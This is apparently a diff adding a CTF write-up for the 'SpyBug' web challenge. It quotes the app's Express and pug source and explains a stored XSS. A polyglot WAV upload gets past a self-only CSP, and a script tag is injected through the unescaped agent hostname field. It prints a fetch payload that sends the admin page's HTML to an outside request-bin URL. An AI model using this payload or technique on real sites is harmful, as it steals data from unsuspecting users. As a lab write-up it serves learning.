@@ -457,6 +457,314 @@ For the flag, look again at the routes' functions, we can get the flag through [
 
 Flag: `HTB{Pr3_C0MP111N6_W17H0U7_P4DD13804rD1N6_5K1115}`
 
-## SpyBug (medium) (coming soon)
+## SpyBug (medium)
+### Challenge
+**Given file:**: [Get it here](https://github.com/HoangREALER/cyberApocalypse2023/blob/main/web_spybug.zip)
+
+**Description**: As Pandora made her way through the ancient tombs, she received a message from her contact in the Intergalactic Ministry of Spies. They had intercepted a communication from a rival treasure hunter who was working for the alien species. The message contained information about a digital portal that leads to a software used for intercepting audio from the Ministry's communication channels. Can you hack into the portal and take down the aliens counter-spying operation?
+
+### Solution
+Right, another login panel with no reigster. But wait what's that ? Look at the source code closely, we will have 2 main routes: `routes/agents` and `routes/main`.
+
+```js
+// agents.js
+const fs = require("fs");
+const path = require("path");
+const { v4: uuidv4 } = require("uuid");
+
+const express = require("express");
+const router = express.Router();
+
+const multer = require("multer");
+
+const {
+  registerAgent,
+  updateAgentDetails,
+  createRecording,
+} = require("./../utils/database");
+
+const authAgent = require("../middleware/authagent");
+
+const storage = multer.diskStorage({
+  filename: (req, file, cb) => {
+    cb(null, uuidv4());
+  },
+  destination: (req, file, cb) => {
+    cb(null, "./uploads");
+  },
+});
+
+const multerUpload = multer({
+  storage: storage,
+  fileFilter: (req, file, cb) => {
+    if (
+      file.mimetype === "audio/wave" &&
+      path.extname(file.originalname) === ".wav"
+    ) {
+      cb(null, true);
+    } else {
+      return cb(null, false);
+    }
+  },
+});
+
+router.get("/agents/register", async (req, res) => {
+  res.status(200).json(await registerAgent());
+});
+
+router.get("/agents/check/:identifier/:token", authAgent, (req, res) => {
+  res.sendStatus(200);
+});
+
+router.post(
+  "/agents/details/:identifier/:token",
+  authAgent,
+  async (req, res) => {
+    const { hostname, platform, arch } = req.body;
+    if (!hostname || !platform || !arch) return res.sendStatus(400);
+    await updateAgentDetails(req.params.identifier, hostname, platform, arch);
+    res.sendStatus(200);
+  }
+);
+
+router.post(
+  "/agents/upload/:identifier/:token",
+  authAgent,
+  multerUpload.single("recording"),
+  async (req, res) => {
+    if (!req.file) return res.sendStatus(400);
+
+    const filepath = path.join("./uploads/", req.file.filename);
+    const buffer = fs.readFileSync(filepath).toString("hex");
+
+    if (!buffer.match(/52494646[a-z0-9]{8}57415645/g)) {
+      fs.unlinkSync(filepath);
+      return res.sendStatus(400);
+    }
+
+    await createRecording(req.params.identifier, req.file.filename);
+    res.send(req.file.filename);
+  }
+);
+
+module.exports = router;
+
+
+// panel.js
+const express = require("express");
+const router = express.Router();
+
+const {
+  checkUserLogin,
+  getAgents,
+  getRecordings,
+} = require("./../utils/database");
+
+const authUser = require("../middleware/authuser");
+
+router.get("/panel", authUser, async (req, res) => {
+  res.render("panel", {
+    username:
+      req.session.username === "admin"
+        ? process.env.FLAG
+        : req.session.username,
+    agents: await getAgents(),
+    recordings: await getRecordings(),
+  });
+});
+
+router.get("/panel/logout", authUser, (req, res) => {
+  req.session.destroy();
+  res.redirect("/panel/login");
+});
+
+router.get("/panel/login", (req, res) => {
+  res.render("login");
+});
+
+router.post("/panel/login", async (req, res) => {
+  let username = req.body.username;
+  let password = req.body.password;
+
+  if (!(username && password)) return res.sendStatus(400);
+  if (!(await checkUserLogin(username, password)))
+    return res.redirect("/panel/login");
+
+  req.session.loggedin = true;
+  req.session.username = username;
+
+  res.redirect("/panel");
+});
+
+module.exports = router;
+```
+
+Let's summarize what they do.
+
+`routes/agent.js` has register function which returns an id and a token that we can use to upload a file. And we can only upload a file with the header which is somewhat similar to `WAV` file. We can also modify `hostname`, `arch` and `platform`.
+
+`routes/panel.js` which only accepts credential of `admin`. If the provided credential is valid, the main panel will render with the recordings that agents provide.
+
+Let's keep in mind that there is a bot being generated at every 60 seconds. This bot will login to the panel and review all panel at a context of a browser. This is no doubt an Client-Side challenge.
+
+```js
+// index.js
+const { visitPanel } = require("./utils/adminbot");
+............
+createAdmin();
+setInterval(visitPanel, 60000);
+
+
+// utils/adminbot.js
+require("dotenv").config();
+
+const puppeteer = require("puppeteer");
+
+const browserOptions = {
+  headless: true,
+  executablePath: "/usr/bin/chromium-browser",
+  args: [
+    "--no-sandbox",
+    "--disable-background-networking",
+    "--disable-default-apps",
+    "--disable-extensions",
+    "--disable-gpu",
+    "--disable-sync",
+    "--disable-translate",
+    "--hide-scrollbars",
+    "--metrics-recording-only",
+    "--mute-audio",
+    "--no-first-run",
+    "--safebrowsing-disable-auto-update",
+    "--js-flags=--noexpose_wasm,--jitless",
+  ],
+};
+
+exports.visitPanel = async () => {
+  try {
+    const browser = await puppeteer.launch(browserOptions);
+    let context = await browser.createIncognitoBrowserContext();
+    let page = await context.newPage();
+
+    await page.goto("http://0.0.0.0:" + process.env.API_PORT, {
+      waitUntil: "networkidle2",
+      timeout: 5000,
+    });
+
+    await page.type("#username", "admin");
+    await page.type("#password", process.env.ADMIN_SECRET);
+    await page.click("#loginButton");
+
+    await page.waitForTimeout(5000);
+    await browser.close();
+  } catch (e) {
+    console.log(e);
+  }
+};
+```
+
+Well since I really wanted to know how the recordings being rendered. I will create a Docker. For those who are new to CTFs, Docker is a good way to debug what really happens behind the curtain.
+
+For the purpose of testing I will modify `./build-docker.sh`  to
+
+```bash
+#!/bin/bash
+docker stop web_spybug
+docker rm web_spybug
+docker rmi $(docker images -f dangling=true -q)
+docker rmi $(docker images -q web_spybug)
+docker build --tag=web_spybug .
+docker run -p 1337:1337 -e API_PORT=1337 -e FLAG="HTB{f4k3_fl4g_f0r_t3st1ng}" -e SESSION_SECRET=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1) -e ADMIN_SECRET="admin" web_spybug 
+```
+
+I changed the admin password from randomly generated 32 characters string to `admin`. Let's build and run the docker using command
+`./build-docker.sh`
+
+While waiting our docker finishes building and runs. Let's look at how are we able to perform such Client-Side XSS attack. Let's look at the template `views/panel.pug`, we will find 2 places that we can place our payload.
+```pug
+if agents.length > 0
+    table.w-100
+        thead
+            tr
+            th ID
+            th Hostname
+            th Platform
+            th Arch
+        tbody
+            each agent in agents
+                tr
+                    td= agent.identifier
+                    td !{agent.hostname}
+                    td !{agent.platform}
+                    td !{agent.arch}
+```
+
+```pug
+tbody
+    each recording in recordings
+        tr
+            td= recording.agentId
+            td
+                audio(controls='')
+                    source(src=recording.filepath)
+```
+
+The first flashes through my mind is `!{agent.hostname}`, `!{agent.platform}` and `!{agent.arch}`. Upon reading the `pug/jade` document
+
+<img src="spybug1.png" alt="jade document"/>
+
+Aaaaaah, so no escape then, so we just need to fix the `hostname` or `platform` or `arch` to `<script>(evil xss)</script>` right ? Unfortunately, it won't work. Let's look at the `index.js` again.
+
+```js
+application.use((req, res, next) => {
+  res.setHeader("Content-Security-Policy", "script-src 'self'; frame-ancestors 'none'; object-src 'none'; base-uri 'none';");
+  res.setHeader("Cache-Control", "no-cache, no-store, must-revalidate");
+  res.setHeader("Pragma", "no-cache");
+  res.setHeader("Expires", "0");
+  next();
+});
+```
+
+There is CSP rule set that only allows source from `self`. What we were trying is called `inline`. You can read the material [here](https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass).
+
+Don't worry, I said 2 things come to my mind while reading the template. The second thing is that the audio use our uploaded `WAV` file. There is a good [writeup](https://dttw.tech/posts/r1jswRaAG) in the past that can clear your mind out. This challenge is more simple. It only checks the header, not the entire file. So we can use hexedit to edit the header of the file to `WAV` header and include our xss payload. You can either use hexedit on your laptop or like me use an online hexeditor.
+
+But does it used `<audio>` tag, how can the script be executed ? You're right, we can't. However if something like `<script src="our-evil-media-file.wav"></script>` appears, it will execute our payload like a charm. Well how can we make it appear ?
+Use `!{hostname}` obviously.
+
+<img src="spybug2.png" alt="Hex edit">
+
+Okay let's go and try out our web built from the docker at `localhost:1337`. We can use `admin:admin` to login to the panel now.
+
+<img src="spybug3.png" alt="Admin panel">
+
+You can either create a form with html to deal with the endpoints and upload file or use `Postman` to deal with it like me.
+
+First me need to register an agent.
+
+<img src="spybug4.png" alt="Register agent">
+
+Use the id and token returned for uploading the file that contains the payload.
+
+<img src="spybug5.png" alt="Upload payload agent">
+
+And finally, inject into html.
+
+<img src="spybug6.png" alt="Upload payload agent">
+
+<img src="spybug7.png" alt="Alert 1">
+
+Spectacular !! Now we only need to modify our payload for it to get all content of the html page at send it to our self hosted server or maybe [RequestBin](https://requestbin.com). The payload I used:
+
+```js
+// change the url of the requestbin
+fetch('https://ensei2x093jq8.x.pipedream.net?muneh=' + document.documentElement.innerHTML)
+```
+
+Repeat all the steps above against challenge server. We will see the flag in the RequestBin we created.
+
+<img src="spybug8.png" alt="Money">
+
+Flag: `HTB{p01yg10t5_4nd_35p10n4g3}`
 
 ## TrapTrack (hard) (coming soon)
